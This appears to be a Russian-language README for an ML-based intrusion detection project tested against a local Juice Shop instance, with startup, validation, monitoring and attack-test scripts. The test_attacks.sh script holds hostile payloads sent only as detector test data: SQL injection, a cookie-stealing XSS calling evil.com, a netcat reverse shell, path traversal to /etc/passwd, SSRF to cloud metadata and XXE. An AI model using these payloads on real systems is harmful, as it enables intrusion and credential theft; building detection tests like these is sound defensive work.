# Orchid2.0
новая версия проекта orchid

# Запустить все сервисы одной командой
./start_orchid.sh
1. Поэтапный запуск с проверкой

# 1. Остановить все предыдущие контейнеры
```
cd ~/orchid-system
docker-compose down 2>/dev/null
docker system prune -af 2>/dev/null
```

# 2. Запустить все сервисы
```
docker-compose up -d
```
# 3. Подождать запуска (10 секунд)
```
sleep 10
```
# 4. Проверить статус контейнеров
```
docker-compose ps
```
2 Базовые проверки
```
bash
# Проверка ML сервисов
curl -s http://localhost:8001/health | jq . || echo "Isolation Forest не отвечает"
curl -s http://localhost:8002/health | jq . || echo "Random Forest не отвечает"
```
# Проверка веб-интерфейсов
```
curl -I http://localhost:3000 | head -1
curl -I http://localhost:3001 | head -1
```
# Открыть админку в браузере
```
echo "Откройте админ панель: http://localhost:3000"
```
3. Автоматизированный скрипт полной проверки
```
bash
cat > validate_system.sh << 'EOF'
#!/bin/bash
echo "=== ПОЛНАЯ ВАЛИДАЦИЯ ORCHID SYSTEM ==="
echo "Время запуска: $(date)"
echo ""

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Функции для вывода
print_success() { echo -e "${GREEN}[✓]${NC} $1"; }
print_error() { echo -e "${RED}[✗]${NC} $1"; }
print_info() { echo -e "${BLUE}[i]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }

# 1. Проверка Docker
echo "1. Проверка Docker окружения:"
if command -v docker &> /dev/null; then
    print_success "Docker установлен ($(docker --version | cut -d' ' -f3 | cut -d',' -f1))"
else
    print_error "Docker не установлен"
    exit 1
fi

if command -v docker-compose &> /dev/null; then
    print_success "Docker Compose установлен"
else
    print_error "Docker Compose не установлен"
    exit 1
fi

# 2. Проверка контейнеров
echo -e "\n2. Проверка запущенных контейнеров:"
containers=$(docker-compose ps --services 2>/dev/null)
if [ $? -ne 0 ]; then
    print_error "Не удалось получить список сервисов. Убедитесь, что docker-compose.yml существует"
    exit 1
fi

running_count=0
total_count=0

for container in $containers; do
    total_count=$((total_count + 1))
    status=$(docker-compose ps $container 2>/dev/null | tail -1 | awk '{print $3}')
    
    if [[ "$status" == "Up"* ]]; then
        print_success "$container: $status"
        running_count=$((running_count + 1))
    else
        print_error "$container: $status (или не запущен)"
    fi
done

if [ $running_count -eq $total_count ]; then
    print_success "Все $total_count контейнеров запущены"
else
    print_warning "Запущено $running_count из $total_count контейнеров"
fi

# 3. Проверка портов
echo -e "\n3. Проверка сетевых портов:"
declare -A ports=(
    ["8001"]="Isolation Forest ML"
    ["8002"]="Random Forest ML"
    ["3000"]="Admin Panel"
    ["3001"]="Juice Shop"
    ["8080"]="CORS Proxy (если есть)"
)

for port in "${!ports[@]}"; do
    if nc -z localhost $port 2>/dev/null; then
        print_success "Порт $port открыт (${ports[$port]})"
    else
        print_warning "Порт $port закрыт (${ports[$port]})"
    fi
done

# 4. Проверка HTTP эндпоинтов
echo -e "\n4. Проверка HTTP сервисов:"
declare -A endpoints=(
    ["http://localhost:8001/health"]="Isolation Forest API"
    ["http://localhost:8002/health"]="Random Forest API"
    ["http://localhost:3000"]="Admin Panel"
    ["http://localhost:3001"]="Juice Shop"
)

for endpoint in "${!endpoints[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 $endpoint 2>/dev/null)
    
    if [ "$response" = "200" ] || [ "$response" = "301" ] || [ "$response" = "302" ]; then
        print_success "${endpoints[$endpoint]}: HTTP $response"
    else
        print_warning "${endpoints[$endpoint]}: HTTP $response или недоступен"
    fi
done

# 5. Проверка ML функциональности
echo -e "\n5. Тестирование ML функциональности:"

# Тест Isolation Forest
print_info "Тестирование Isolation Forest..."
iso_response=$(curl -s -X POST http://localhost:8001/predict \
  -H "Content-Type: application/json" \
  -d '{"test":"normal_traffic"}')

if echo "$iso_response" | grep -q "is_anomaly"; then
    anomaly=$(echo $iso_response | python3 -c "import sys,json; print(json.load(sys.stdin)['is_anomaly'])")
    if [ "$anomaly" = "False" ]; then
        print_success "Isolation Forest: нормальный трафик определен верно"
    else
        print_warning "Isolation Forest: возможно ложное срабатывание"
    fi
else
    print_error "Isolation Forest: неверный ответ"
fi

# Тест Random Forest
print_info "Тестирование Random Forest..."
rf_response=$(curl -s -X POST http://localhost:8002/predict \
  -H "Content-Type: application/json" \
  -d '{"test":"attack_traffic"}')

if echo "$rf_response" | grep -q "prediction"; then
    prediction=$(echo $rf_response | python3 -c "import sys,json; print(json.load(sys.stdin)['prediction'])")
    print_success "Random Forest: предсказание '$prediction'"
else
    print_error "Random Forest: неверный ответ"
fi

# 6. Проверка CORS заголовков
echo -e "\n6. Проверка CORS поддержки:"
cors_check=$(curl -s -I http://localhost:8001/health | grep -i "access-control-allow-origin")

if [[ "$cors_check" == *"*"* ]]; then
    print_success "CORS заголовки настроены правильно"
else
    print_warning "CORS заголовки отсутствуют или настроены неправильно"
fi

# 7. Проверка интеграции с Juice Shop
echo -e "\n7. Проверка интеграции с Juice Shop:"
if command -v python3 &> /dev/null; then
    if [ -f "monitor_juice_improved.py" ]; then
        print_info "Запуск тестового мониторинга на 5 секунд..."
        timeout 5 python3 -c "
import requests
try:
    r = requests.get('http://localhost:3001', timeout=2)
    print('  Juice Shop доступен')
    
    # Тестовая атака
    test_data = {'request': {'url': 'http://localhost:3001/login', 'body': \"' OR '1'='1'\"}}
    ml_resp = requests.post('http://localhost:8001/predict', json=test_data, timeout=2)
    if ml_resp.json().get('is_anomaly'):
        print('  Атака обнаружена ML системой')
    else:
        print('  Атака не обнаружена')
except Exception as e:
    print(f'  Ошибка: {e}')
" 2>/dev/null && print_success "Интеграция работает" || print_warning "Проблемы с интеграцией"
    else
        print_warning "Файл monitor_juice_improved.py не найден"
    fi
else
    print_warning "Python3 не установлен, пропускаем проверку интеграции"
fi

# 8. Генерация отчета
echo -e "\n8. Финальный отчет:"
echo "========================================"
echo "СИСТЕМА ORCHID"
echo "Время проверки: $(date)"
echo "----------------------------------------"
echo "Контейнеры: $running_count/$total_count запущено"
echo "Основные сервисы:"
echo "  - ML Isolation Forest: $(curl -s http://localhost:8001/health | python3 -c "import sys,json; print(json.load(sys.stdin).get('status', 'ERROR'))" 2>/dev/null || echo 'UNKNOWN')"
echo "  - ML Random Forest: $(curl -s http://localhost:8002/health | python3 -c "import sys,json; print(json.load(sys.stdin).get('status', 'ERROR'))" 2>/dev/null || echo 'UNKNOWN')"
echo "  - Админ панель: $(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000 && echo 'ONLINE' || echo 'OFFLINE')"
echo "  - Juice Shop: $(curl -s -o /dev/null -w "%{http_code}" http://localhost:3001 && echo 'ONLINE' || echo 'OFFLINE')"
echo "----------------------------------------"
echo "Доступ к интерфейсам:"
echo "  Админка:    http://localhost:3000"
echo "  Juice Shop: http://localhost:3001"
echo "  ML APIs:    http://localhost:8001/docs (если есть)"
echo "========================================"

if [ $running_count -eq $total_count ]; then
    echo -e "\n${GREEN}✅ СИСТЕМА ГОТОВА К РАБОТЕ${NC}"
    echo "Запустите мониторинг: python3 monitor_juice_improved.py"
else
    echo -e "\n${YELLOW}⚠️  ЕСТЬ ПРОБЛЕМЫ${NC}"
    echo "Проверьте логи: docker-compose logs"
fi
EOF

chmod +x validate_system.sh
./validate_system.sh
```
3. Все скрипты для тестирования

3.1 Основные скрипты запуска
```bash
# start_orchid.sh - запуск всей системы
cat > start_orchid.sh << 'EOF'
#!/bin/bash
echo "Запуск Orchid Security System..."
echo "Время: $(date)"
echo ""

# Останавливаем старые контейнеры
echo "1. Очистка старых контейнеров..."
docker-compose down 2>/dev/null

# Запускаем
echo "2. Запуск контейнеров..."
docker-compose up -d

# Ждем
echo "3. Ожидание запуска сервисов..."
sleep 8

# Проверяем
echo "4. Проверка запуска..."
docker-compose ps

echo ""
echo "=== СИСТЕМА ЗАПУЩЕНА ==="
echo "Админ панель: http://localhost:3000"
echo "Juice Shop:   http://localhost:3001"
echo ""
echo "Для проверки работы выполните: ./check_system.sh"
echo "Для запуска мониторинга: python3 monitor_juice_improved.py"
EOF

chmod +x start_orchid.sh

# stop_orchid.sh - остановка системы
cat > stop_orchid.sh << 'EOF'
#!/bin/bash
echo "Остановка Orchid Security System..."
docker-compose down
echo "Система остановлена."
EOF

chmod +x stop_orchid.sh

# restart_orchid.sh - перезапуск
cat > restart_orchid.sh << 'EOF'
#!/bin/bash
./stop_orchid.sh
sleep 2
./start_orchid.sh
EOF

chmod +x restart_orchid.sh
```
3.2 Скрипты тестирования
```bash
# test_attacks.sh - тестирование различных атак
cat > test_attacks.sh << 'EOF'
#!/bin/bash
echo "=== ТЕСТИРОВАНИЕ АТАК НА ORCHID ==="
echo ""

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

test_attack() {
    local name=$1
    local payload=$2
    local type=$3
    
    echo -e "${YELLOW}Тест: $name${NC}"
    echo "Полезная нагрузка: $payload"
    
    # Формируем тестовые данные
    test_data=$(cat << JSON
{
    "request": {
        "url": "http://localhost:3001/login",
        "method": "POST",
        "body": "$payload",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Attack Tester)",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    },
    "metadata": {
        "source_ip": "192.168.1.$((RANDOM % 255))",
        "timestamp": "$(date -Iseconds)",
        "attack_type": "$type"
    }
}
JSON
    )
    
    # Отправляем в Isolation Forest
    echo -n "Isolation Forest: "
    iso_response=$(curl -s -X POST http://localhost:8001/predict \
        -H "Content-Type: application/json" \
        -d "$test_data")
    
    if echo "$iso_response" | grep -q "is_anomaly"; then
        is_anomaly=$(echo $iso_response | python3 -c "import sys,json; print(json.load(sys.stdin)['is_anomaly'])")
        if [ "$is_anomaly" = "True" ]; then
            echo -e "${GREEN}✓ Аномалия обнаружена${NC}"
        else
            echo -e "${RED}✗ Аномалия не обнаружена${NC}"
        fi
    else
        echo -e "${RED}✗ Ошибка запроса${NC}"
    fi
    
    # Отправляем в Random Forest
    echo -n "Random Forest: "
    rf_response=$(curl -s -X POST http://localhost:8002/predict \
        -H "Content-Type: application/json" \
        -d "$test_data")
    
    if echo "$rf_response" | grep -q "prediction"; then
        prediction=$(echo $rf_response | python3 -c "import sys,json; print(json.load(sys.stdin)['prediction'])")
        confidence=$(echo $rf_response | python3 -c "import sys,json; print(json.load(sys.stdin)['confidence'])")
        echo -e "${GREEN}✓ Предсказание: $prediction (уверенность: ${confidence})${NC}"
    else
        echo -e "${RED}✗ Ошибка запроса${NC}"
    fi
    
    echo ""
}

echo "1. SQL Injection атаки:"
test_attack "Basic SQL Injection" "' OR '1'='1' --" "sqli"
test_attack "UNION SQL Injection" "' UNION SELECT username, password FROM users --" "sqli"
test_attack "Time-based SQLi" "' OR SLEEP(5) --" "sqli"

echo "2. XSS атаки:"
test_attack "Basic XSS" "<script>alert('XSS')</script>" "xss"
test_attack "XSS with Event" "<img src=x onerror=alert(1)>" "xss"
test_attack "Stealing Cookies" "<script>fetch('http://evil.com?cookie='+document.cookie)</script>" "xss"

echo "3. Path Traversal:"
test_attack "Basic LFI" "../../../etc/passwd" "path_traversal"
test_attack "Encoded LFI" "..%2f..%2f..%2fetc%2fpasswd" "path_traversal"

echo "4. Command Injection:"
test_attack "Basic RCE" "; ls -la /" "rce"
test_attack "Reverse Shell" "| nc -e /bin/sh 192.168.1.100 4444" "rce"

echo "5. Другие атаки:"
test_attack "SSRF" "http://169.254.169.254/latest/meta-data/" "ssrf"
test_attack "XXE" "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>" "xxe"

echo "=== ТЕСТИРОВАНИЕ ЗАВЕРШЕНО ==="
echo "Проверьте админ панель: http://localhost:3000"
echo "Должны появиться записи об обнаруженных атаках"
EOF

chmod +x test_attacks.sh

# test_integration.sh - проверка интеграции
cat > test_integration.sh << 'EOF'
#!/bin/bash
echo "=== ПРОВЕРКА ИНТЕГРАЦИИ ORCHID ==="
echo ""

# 1. Проверка связи между компонентами
echo "1. Проверка связи компонентов:"
echo -n "  ML сервисы → Админка: "
if curl -s http://localhost:3000 > /dev/null && curl -s http://localhost:8001/health > /dev/null; then
    echo "✓ Связь есть"
else
    echo "✗ Нет связи"
fi

echo -n "  Juice Shop → ML сервисы: "
timeout 2 python3 -c "
import requests
try:
    # Проверяем Juice Shop
    r1 = requests.get('http://localhost:3001', timeout=1)
    
    # Проверяем возможность отправки данных в ML
    test_data = {'test': 'integration'}
    r2 = requests.post('http://localhost:8001/predict', json=test_data, timeout=1)
    
    if r1.status_code < 500 and r2.status_code < 500:
        print('✓ Интеграция работает')
    else:
        print('✗ Проблемы с интеграцией')
except:
    print('✗ Ошибка интеграции')
" 2>/dev/null || echo "✗ Таймаут"

# 2. Тест полного цикла
echo ""
echo "2. Тест полного цикла обнаружения:"
echo "   Запуск симуляции атаки..."

# Запускаем мониторинг на 10 секунд в фоне
timeout 10 python3 -c "
import requests
import time
import random

print('  Отправка тестовых запросов...')
for i in range(5):
    # Случайные атаки
    attacks = [
        {'type': 'normal', 'payload': 'page=' + str(i)},
        {'type': 'sqli', 'payload': \"' OR \" + str(i) + \"=\" + str(i)},
        {'type': 'xss', 'payload': '<script>test' + str(i) + '</script>'}
    ]
    
    attack = random.choice(attacks)
    
    data = {
        'request': {
            'url': 'http://localhost:3001/search',
            'method': 'GET',
            'body': attack['payload'],
            'headers': {'User-Agent': 'Test-Bot'}
        },
        'metadata': {
            'source_ip': f'192.168.1.{random.randint(1,255)}',
            'timestamp': '2024-01-15T12:00:00Z',
            'attack_type': attack['type']
        }
    }
    
    try:
        # Отправляем в оба ML сервиса
        r1 = requests.post('http://localhost:8001/predict', json=data, timeout=1)
        r2 = requests.post('http://localhost:8002/predict', json=data, timeout=1)
        
        if r1.status_code == 200 and r2.status_code == 200:
            iso_result = r1.json().get('is_anomaly', False)
            rf_result = r2.json().get('is_attack', False)
            
            if iso_result or rf_result:
                print(f'    Запрос {i+1}: АТАКА ОБНАРУЖЕНА')
            else:
                print(f'    Запрос {i+1}: нормальный трафик')
        else:
            print(f'    Запрос {i+1}: ошибка ML сервисов')
    except:
        print(f'    Запрос {i+1}: исключение')
    
    time.sleep(0.5)

print('  Тест завершен')
" 2>/dev/null

echo ""
echo "3. Проверка данных в админке:"
echo "   Откройте http://localhost:3000"
echo "   В таблице должны появиться записи об обнаруженных атаках"
echo ""
echo "=== ПРОВЕРКА ЗАВЕРШЕНА ==="
EOF

chmod +x test_integration.sh
```
3.3 Мониторинг и логирование
```bash
# monitor_system.sh - мониторинг системы в реальном времени
cat > monitor_system.sh << 'EOF'
#!/bin/bash
echo "=== РЕАЛЬНЫЙ МОНИТОРИНГ ORCHID ==="
echo "Нажмите Ctrl+C для остановки"
echo ""

# Цвета
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Функция для отображения статуса
show_status() {
    clear
    echo -e "${BLUE}=== ORCHID SECURITY MONITOR ===${NC}"
    echo "Время: $(date '+%H:%M:%S')"
    echo ""
    
    # Статус контейнеров
    echo -e "${YELLOW}Статус контейнеров:${NC}"
    docker-compose ps --format "table {{.Name}}\t{{.Status}}\t{{.Ports}}" | tail -n +2
    
    echo ""
    
    # Статус ML сервисов
    echo -e "${YELLOW}Статус ML сервисов:${NC}"
    for port in 8001 8002; do
        response=$(timeout 1 curl -s http://localhost:$port/health 2>/dev/null)
        if [ $? -eq 0 ]; then
            status=$(echo $response | python3 -c "import sys,json; print(json.load(sys.stdin).get('status', 'ERROR'))" 2>/dev/null || echo "ERROR")
            echo -e "  Порт $port: ${GREEN}$status${NC}"
        else
            echo -e "  Порт $port: ${RED}OFFLINE${NC}"
        fi
    done
    
    echo ""
    
    # Последние логи атак
    echo -e "${YELLOW}Последние обнаруженные атаки:${NC}"
    if [ -f "attacks.db" ]; then
        sqlite3 attacks.db "SELECT timestamp, attack_type, source_ip FROM attacks ORDER BY id DESC LIMIT 5;" 2>/dev/null | while IFS='|' read -r ts type ip; do
            echo "  $ts - $type - $ip"
        done || echo "  База данных пуста"
    else
        echo "  База данных не создана"
    fi
    
    echo ""
    echo -e "${YELLOW}Статистика:${NC}"
    echo "  Для выхода: Ctrl+C"
    echo "  Для обновления: Enter"
}

# Основной цикл
while true; do
    show_status
    read -t 5 -p "Обновить через 5 сек (или Enter для обновления сейчас)..." 
done
EOF

chmod +x monitor_system.sh

# check_logs.sh - проверка логов
cat > check_logs.sh << 'EOF'
#!/bin/bash
echo "=== ПРОВЕРКА ЛОГОВ ORCHID ==="
echo ""

echo "1. Логи ML сервисов (последние 10 строк):"
echo -e "\n--- Isolation Forest ---"
docker-compose logs --tail=10 ml-isolation 2>/dev/null | grep -v "^$" || echo "Нет логов"
echo -e "\n--- Random Forest ---"
docker-compose logs --tail=10 ml-random 2>/dev/null | grep -v "^$" || echo "Нет логов"

echo -e "\n2. Локи веб-сервисов:"
echo -e "\n--- Admin Panel ---"
docker-compose logs --tail=5 admin 2>/dev/null | grep -v "^$" || echo "Нет логов"
echo -e "\n--- Juice Shop ---"
docker-compose logs --tail=5 juice-shop 2>/dev/null | grep -v "^$" || echo "Нет логов"

echo -e "\n3. Локи всех сервисов (ошибки):"
docker-compose logs --tail=20 2>/dev/null | grep -i "error\|fail\|exception" | tail -10 || echo "Ошибок не найдено"

echo -e "\n4. Проверка системных ресурсов:"
docker stats --no-stream --format "table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}" 2>/dev/null || echo "Не удалось получить статистику"

echo -e "\n=== ПРОВЕРКА ЗАВЕРШЕНА ==="
EOF

chmod +x check_logs.sh
```
4. Комплексный тест всей системы
```
bash
# run_full_test.sh - полный тест системы
cat > run_full_test.sh << 'EOF'
#!/bin/bash
echo "=== ПОЛНЫЙ ТЕСТ ORCHID SECURITY SYSTEM ==="
echo "Начало: $(date)"
echo ""

# Создаем директорию для отчетов
REPORT_DIR="orchid_reports_$(date +%Y%m%d_%H%M%S)"
mkdir -p $REPORT_DIR

# Функция для записи в отчет
log_report() {
    echo "$1" | tee -a "$REPORT_DIR/full_report.txt"
}

log_report "Полный тест Orchid System"
log_report "Дата: $(date)"
log_report ""

# 1. Проверка окружения
log_report "1. ПРОВЕРКА ОКРУЖЕНИЯ"
log_report "---------------------"
log_report "Docker: $(docker --version 2>/dev/null || echo 'Не установлен')"
log_report "Docker Compose: $(docker-compose --version 2>/dev/null || echo 'Не установлен')"
log_report "Python3: $(python3 --version 2>/dev/null || echo 'Не установлен')"
log_report ""

# 2. Запуск системы
log_report "2. ЗАПУСК СИСТЕМЫ"
log_report "-----------------"
./start_orchid.sh >> "$REPORT_DIR/startup.log" 2>&1
sleep 10
log_report "Запуск завершен (логи в $REPORT_DIR/startup.log)"
log_report ""

# 3. Базовые проверки
log_report "3. БАЗОВЫЕ ПРОВЕРКИ"
log_report "-------------------"
./validate_system.sh > "$REPORT_DIR/validation.log" 2>&1
tail -20 "$REPORT_DIR/validation.log" | while read line; do log_report "  $line"; done
log_report ""

# 4. Тестирование атак
log_report "4. ТЕСТИРОВАНИЕ АТАК"
log_report "-------------------"
./test_attacks.sh > "$REPORT_DIR/attacks_test.log" 2>&1
echo "Тестирование атак завершено (полный лог в $REPORT_DIR/attacks_test.log)"
log_report ""

# 5. Проверка интеграции
log_report "5. ПРОВЕРКА ИНТЕГРАЦИИ"
log_report "----------------------"
./test_integration.sh > "$REPORT_DIR/integration.log" 2>&1
log_report "Интеграция проверена (логи в $REPORT_DIR/integration.log)"
log_report ""

# 6. Запуск мониторинга на 30 секунд
log_report "6. ТЕСТ МОНИТОРИНГА"
log_report "-------------------"
log_report "Запуск мониторинга на 30 секунд..."
timeout 30 python3 monitor_juice_improved.py > "$REPORT_DIR/monitoring.log" 2>&1 &
MONITOR_PID=$!
sleep 35
log_report "Мониторинг завершен (логи в $REPORT_DIR/monitoring.log)"
log_report ""

# 7. Проверка логов
log_report "7. АНАЛИЗ ЛОГОВ"
log_report "---------------"
./check_logs.sh > "$REPORT_DIR/logs_check.log" 2>&1
log_report "Анализ логов завершен (полный отчет в $REPORT_DIR/logs_check.log)"
log_report ""

# 8. Сбор статистики
log_report "8. СТАТИСТИКА СИСТЕМЫ"
log_report "---------------------"
log_report "Контейнеры:"
docker-compose ps >> "$REPORT_DIR/stats.log" 2>&1
docker-compose ps | tail -n +2 | while read line; do log_report "  $line"; done
log_report ""

log_report "Использование ресурсов:"
docker stats --no-stream --format "table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}" 2>> "$REPORT_DIR/stats.log" | while read line; do log_report "  $line"; done
log_report ""

# 9. Финальный отчет
log_report "9. ФИНАЛЬНЫЙ ОТЧЕТ"
log_report "------------------"
log_report "Время завершения: $(date)"
log_report "Все отчеты сохранены в директории: $REPORT_DIR"
log_report ""
log_report "Содержимое директории отчетов:"
ls -la "$REPORT_DIR/" | while read line; do log_report "  $line"; done
log_report ""
log_report "=== ТЕСТИРОВАНИЕ ЗАВЕРШЕНО ==="
log_report ""
log_report "Рекомендации:"
log_report "1. Откройте админ панель: http://localhost:3000"
log_report "2. Проверьте таблицу обнаруженных атак"
log_report "3. Запустите длительный мониторинг: python3 monitor_juice_improved.py"
log_report "4. Для остановки системы: ./stop_orchid.sh"

echo ""
echo "Полный отчет сохранен в: $REPORT_DIR/full_report.txt"
echo "Откройте файл для детальной информации: cat $REPORT_DIR/full_report.txt"
EOF

chmod +x run_full_test.sh
```
5. Использование системы пошагово
Шаг 1: Запуск системы
```
bash
./start_orchid.sh
```
Шаг 2: Проверка работоспособности
```
bash
./validate_system.sh
```
Шаг 3: Тестирование обнаружения атак
```
bash
./test_attacks.sh
```
Шаг 4: Запуск автоматического мониторинга
```
bash
# В отдельном терминале
python3 monitor_juice_improved.py

# Или с выводом в файл
python3 monitor_juice_improved.py > monitoring.log 2>&1 &
```
Шаг 5: Мониторинг в реальном времени
```
bash
./monitor_system.sh
```
Шаг 6: Проверка логов
```
bash
./check_logs.sh
# Или просмотр логов конкретного сервиса
docker-compose logs -f ml-isolation
```
Шаг 7: Полный тест системы
```
bash
./run_full_test.sh
```
Шаг 8: Остановка системы
```
bash
./stop_orchid.sh
```
6. Краткая шпаргалка по командам
```
bash
# Основные команды
start_orchid.sh          # Запуск всей системы
stop_orchid.sh           # Остановка системы
restart_orchid.sh        # Перезапуск

# Тестирование
validate_system.sh       # Базовая проверка
test_attacks.sh          # Тест различных атак
test_integration.sh      # Проверка интеграции
run_full_test.sh         # Полный тест системы

# Мониторинг
monitor_system.sh        # Реалтайм мониторинг
check_logs.sh            # Проверка логов
python3 monitor_juice_improved.py  # Автоматический мониторинг

# Отладка
docker-compose ps        # Статус контейнеров
docker-compose logs      # Логи всех сервисов
docker-compose logs ml-isolation  # Логи конкретного сервиса
```
7. Что проверяет система
✅ Доступность сервисов (порты 8001, 8002, 3000, 3001)

✅ Работу ML алгоритмов (Isolation Forest и Random Forest)

✅ Обнаружение атак (SQLi, XSS, LFI, RCE и др.)

✅ Интеграцию компонентов (агент → ML → админка)

✅ CORS заголовки для работы из браузера

✅ Логирование и мониторинг в реальном времени

✅ Работу админ-панели и реакцию на инциденты

✅ Стабильность системы под нагрузкой

8. Ожидаемые результаты
После запуска всех тестов вы должны получить:

Зеленые статусы всех сервисов в админке (http://localhost:3000)

Записи об обнаруженных атаках в таблице

Цветные логи обнаружения в консоли

Отчеты в директории orchid_reports_*

Работающую систему, готовую к эксплуатации

Система считается успешно развернутой, если все тесты проходят и админка показывает зеленые статусы ML сервисов. 🎉
